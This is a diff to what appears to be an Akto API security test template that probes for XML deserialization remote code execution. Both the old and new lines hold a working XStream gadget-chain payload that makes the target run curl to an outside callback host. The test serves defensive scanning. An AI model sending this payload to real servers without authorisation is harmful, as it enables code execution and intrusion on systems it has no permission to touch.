@@ -32,7 +32,7 @@ execute:
         - modify_method: POST
         - send_ssrf_req:
             url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-        - replace_body: '<sorted-set> <string>foo</string> <contact class="dynamic-proxy"><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>curl</string><string>https://test-services.akto.io/store_uuid/${random_uuid}</string></command></target><action>start</action></handler></contact></sorted-set>'
+        - replace_body: '<sorted-set> <string>foo</string> <contact class="dynamic-proxy"><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>curl</string><string>https://test-services.akto.io/${random_uuid}</string></command></target><action>start</action></handler></contact></sorted-set>'
         - modify_url: "/"
         - add_header:
             content-type: "application/xml"
